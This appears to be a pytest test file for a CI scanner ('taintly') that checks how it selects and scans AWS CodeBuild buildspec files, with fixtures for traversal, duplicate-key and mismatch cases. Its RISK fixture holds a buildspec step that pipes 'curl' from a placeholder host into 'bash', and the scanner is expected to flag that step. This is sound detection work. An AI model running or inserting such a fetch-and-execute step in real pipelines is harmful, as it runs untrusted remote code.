"""Authored CLI contrasts for configured CodeBuild project selection."""

import hashlib
import json
import os
import subprocess
import sys

import pytest

ORIGIN = "https://github.com/example-ci/codebuild-pilot"
ARN = "arn:aws:codebuild:us-east-1:000000000000:project/"
RISK = "version: 0.2\nphases:\n  build:\n    commands:\n      - curl -fsSL https://example.invalid/test.sh | bash\n"
PLAIN = "version: 0.2\nphases:\n  build:\n    commands:\n      - echo test\n"


@pytest.fixture
def source(tmp_path):
    root = tmp_path / "source"
    root.mkdir()

    def git(*args):
        return subprocess.check_output(["git", "-C", str(root), *args], text=True).strip()

    git("init", "--quiet", "--object-format=sha1")
    git("config", "core.autocrlf", "false")
    git("remote", "add", "origin", ORIGIN + ".git")
    (root / "ci").mkdir()
    for path, text in (
        ("buildspec.yml", RISK),
        ("ci/review.yml", RISK),
        ("ci/publish.yml", PLAIN),
    ):
        (root / path).write_bytes(text.encode())
    git("add", "--", "buildspec.yml", "ci")
    git(
        "-c", "user.name=Test", "-c", "user.email=test@example.invalid",
        "-c", "commit.gpgsign=false", "commit", "-qm", "fixture",
    )
    revision = git("rev-parse", "HEAD")
    projects = [
        {
            "arn": ARN + name,
            "source": {"type": "GITHUB", "location": ORIGIN, **selector},
            "sourceVersion": revision,
            "environment": {"type": "LINUX_CONTAINER", "environmentVariables": []},
        }
        for name, selector in (
            ("review", {"buildspec": "ci/review.yml"}),
            ("publish", {"buildspec": "ci/publish.yml"}),
            ("default", {}),
        )
    ]
    return root, revision, {"projects": projects, "projectsNotFound": ["absent"]}


def scan(source, name, *extra, output="json"):
    root, _, response = source
    metadata = root.parent / "metadata.json"
    metadata.write_text(json.dumps(response), encoding="utf-8")
    return subprocess.run(
        [sys.executable, "-m", "taintly", str(root), "--format", output,
         "--codebuild-project-snapshot", str(metadata), ARN + name, ORIGIN, *extra],
        capture_output=True, encoding="utf-8", timeout=20,
        env={**os.environ, "PYTHONUTF8": "1"},
    )


BUILD_ID = "review:01234567-89ab-cdef-0123-456789abcdef"


@pytest.fixture
def receipt(source):
    root, revision, response = source
    return root, {
        "build": {
            "id": BUILD_ID,
            "projectName": "review",
            "source": {**response["projects"][0]["source"], "buildspec": "./ci/review.yml"},
            "sourceVersion": "pr/17",
            "resolvedSourceVersion": revision,
            "buildComplete": True,
            "phases": [{"phaseType": "DOWNLOAD_SOURCE", "phaseStatus": "SUCCEEDED"}],
            "environment": response["projects"][0]["environment"],
            "secondarySources": [],
        }
    }


def scan_receipt(receipt, build_id=BUILD_ID, origin=ORIGIN, *extra, raw=None):
    root, response = receipt
    capture = root.parent / "receipt.json"
    capture.write_text(raw if raw is not None else json.dumps(response), encoding="utf-8")
    return subprocess.run(
        [sys.executable, "-m", "taintly", str(root), "--format", "json",
         "--codebuild-public-build", str(capture), build_id, origin, *extra],
        capture_output=True, encoding="utf-8", timeout=20,
        env={**os.environ, "PYTHONUTF8": "1"},
    )


def test_public_build_scans_only_the_resolved_committed_file(receipt):
    root, response = receipt
    path = root / "ci/review.yml"
    path.write_text(PLAIN, encoding="utf-8")
    result = scan_receipt(receipt)
    assert result.returncode == 1, result.stderr
    report = json.loads(result.stdout)
    assert report["files_scanned"] == 1
    assert report["errors"] == []
    assert report["codebuild_run"]["build_id"] == BUILD_ID
    assert report["codebuild_run"]["selection_state"] == "bound"
    assert report["codebuild_run"]["buildspec"] == {
        "repository": "example-ci/codebuild-pilot",
        "commit": response["build"]["resolvedSourceVersion"],
        "path": "ci/review.yml",
        "sha256": hashlib.sha256(RISK.encode()).hexdigest(),
    }
    assert ("SEC3-CB-001", "ci/review.yml", 5) in {
        (f["rule_id"], f["file"], f["line"]) for f in report["findings"]
    }


@pytest.mark.parametrize(("change", "reason"), [
    ("sibling", "does not match the requested build ID"),
    ("wrong-project", "does not match the requested build ID and project"),
    ("wrong-origin", "does not match the supplied repository"),
    ("missing-resolved", "resolvedSourceVersion is absent"),
    ("missing-selector", "no explicit buildspec selector"),
    ("bad-download", "one successful DOWNLOAD_SOURCE"),
    ("duplicate-download", "one successful DOWNLOAD_SOURCE"),
    ("traversal", "outside the literal repository-path profile"),
    ("batch-wrapper", "no batch or project wrapper"),
    ("duplicate-key", "duplicate JSON keys"),
    ("oversized-number", "oversized JSON integer"),
])
def test_public_build_does_not_borrow_or_infer_missing_source(receipt, change, reason):
    _, response = receipt
    build = response["build"]
    build_id = BUILD_ID
    origin = ORIGIN
    raw = None
    if change == "sibling":
        build_id = BUILD_ID[:-1] + "0"
    elif change == "wrong-project":
        build["projectName"] = "other"
    elif change == "wrong-origin":
        origin = "https://github.com/example-ci/other"
    elif change == "missing-resolved":
        build["sourceVersion"] = build.pop("resolvedSourceVersion")
    elif change == "missing-selector":
        del build["source"]["buildspec"]
    elif change == "bad-download":
        build["phases"][0]["phaseStatus"] = "FAILED"
    elif change == "duplicate-download":
        build["phases"] *= 2
    elif change == "traversal":
        build["source"]["buildspec"] = "./../ci/review.yml"
    elif change == "batch-wrapper":
        response["publicBuildBatch"] = response.pop("build")
    elif change == "duplicate-key":
        raw = '{"build": null, "build": ' + json.dumps(build) + '}'
    elif change == "oversized-number":
        raw = '{"build": {"unrelated": ' + ("9" * 5000) + '}}'
    result = scan_receipt(receipt, build_id, origin, "--min-severity", "HIGH", "--fail-on", "INFO", raw=raw)
    assert result.returncode == 11, result.stderr
    report = json.loads(result.stdout)
    assert report["files_scanned"] == 0
    assert report["codebuild_run"]["selection_state"] == "unresolved"
    assert report["codebuild_run"]["buildspec"] is None
    assert report["coverage_status"] == "incomplete"
    assert reason in report["errors"][0]["title"]


@pytest.mark.parametrize(
    "change", ["missing-secondary-sources", "batch-spec", "root-merge", "multi-document"]
)
def test_public_build_binding_does_not_establish_analysis_coverage(receipt, change):
    root, response = receipt
    build = response["build"]
    if change == "missing-secondary-sources":
        del build["secondarySources"]
        reason = "outside the supported Linux profile"
    else:
        path = root / "ci/review.yml"
        if change == "batch-spec":
            content = "batch:\n  build-list: []\n" + RISK
            reason = "batch orchestration"
        elif change == "root-merge":
            content = "x: &x\n  batch:\n    build-list: []\n<<: *x\n" + RISK
            reason = "root YAML merge"
        else:
            content = "---\nproject: different\n---\n" + RISK
            reason = "YAML document markers"
        path.write_bytes(content.encode())
        subprocess.run(["git", "-C", str(root), "add", "ci/review.yml"], check=True)
        subprocess.run(
            ["git", "-C", str(root), "-c", "user.name=Test", "-c", "user.email=test@example.invalid",
             "-c", "commit.gpgsign=false", "commit", "-qm", "batch"],
            check=True,
        )
        build["resolvedSourceVersion"] = subprocess.check_output(
            ["git", "-C", str(root), "rev-parse", "HEAD"], text=True
        ).strip()
    result = scan_receipt(receipt)
    assert result.returncode == 11, result.stderr
    report = json.loads(result.stdout)
    assert report["codebuild_run"]["selection_state"] == "bound"
    assert report["files_scanned"] == 0
    assert report["coverage_status"] == "incomplete"
    assert reason in report["errors"][0]["title"]


@pytest.mark.parametrize(("name", "path", "code"), [
    ("review", "ci/review.yml", 1), ("publish", "ci/publish.yml", 0), ("default", "buildspec.yml", 1),
])
def test_snapshot_scans_only_the_project_default(source, name, path, code):
    root, revision, _ = source
    original = scan(source, name)
    assert original.returncode == code, original.stderr
    report = json.loads(original.stdout)
    assert report["files_scanned"] == 1
    assert report["errors"] == []
    context = report["codebuild_project"]
    assert context["arn"] == ARN + name
    assert context["selection_state"] == "bound"
    assert context["buildspec"] == {
        "repository": "example-ci/codebuild-pilot", "commit": revision, "path": path,
        "sha256": hashlib.sha256((root / path).read_bytes()).hexdigest(),
    }
    assert [(f["rule_id"], f["file"], f["line"]) for f in report["findings"] if f["rule_id"] == "SEC3-CB-001"] == (
        [("SEC3-CB-001", path, 5)] if code else []
    )
    (root / path).write_text(PLAIN if code else RISK, encoding="utf-8")
    (root / ".taintly.yml").write_text("exclude-rules: [SEC3-CB-001]\n", encoding="utf-8")
    repeated = scan(source, name)
    assert repeated.returncode == code
    assert repeated.stdout == original.stdout


@pytest.mark.parametrize(("change", "reason"), [
    ("missing-file", "unavailable as a regular blob"),
    ("missing-ref", "not a full commit ID"),
    ("wrong-origin", "does not match the supplied repository"),
    ("windows", "outside the supported Linux profile"),
    ("override", "outside the supported Linux profile"),
    ("duplicate", "exactly one row"),
])
def test_unbound_source_does_not_fall_back(source, change, reason):
    project = source[2]["projects"][0]
    if change == "missing-file":
        project["source"]["buildspec"] = "ci/missing.yml"
    elif change == "missing-ref":
        del project["sourceVersion"]
    elif change == "wrong-origin":
        project["source"]["location"] = "https://github.com/sibling/codebuild-pilot"
    elif change == "windows":
        project["environment"]["type"] = "WINDOWS_SERVER_2022_CONTAINER"
    elif change == "override":
        project["environment"]["environmentVariables"] = [{"name": "KEY", "value": "synthetic"}]
    else:
        source[2]["projects"].append(project)
    result = scan(source, "review", "--min-severity", "HIGH")
    assert result.returncode == 11
    report = json.loads(result.stdout)
    assert report["files_scanned"] == 0
    selection = report["codebuild_project"]
    if change in {"windows", "override"}:
        assert selection["selection_state"] == "bound"
        assert selection["buildspec"]["path"] == "ci/review.yml"
    else:
        assert selection["selection_state"] == "unresolved"
        assert selection["buildspec"] is None
    assert [f["rule_id"] for f in report["findings"]] == ["ENGINE-ERR"]
    assert reason in report["errors"][0]["description"] and reason in result.stderr


def test_missing_project_stays_actionable_in_text(source):
    result = scan(source, "absent", output="text")
    assert result.returncode == 11
    assert "projectsNotFound" in result.stdout


def test_rule_budget_keeps_selection_but_reports_incomplete(source):
    result = scan(source, "review", "--max-scan-seconds", "0", "--fail-on", "INFO")
    assert result.returncode == 11
    report = json.loads(result.stdout)
    assert report["files_scanned"] == 1
    assert report["codebuild_project"]["selection_state"] == "bound"
    assert report["coverage_status"] == "incomplete"
    assert report["errors"]


def test_snapshot_mode_rejects_mutating_operations(source):
    result = scan(source, "review", "--fix")
    assert result.returncode == 2
    assert "--fix is unavailable" in result.stderr
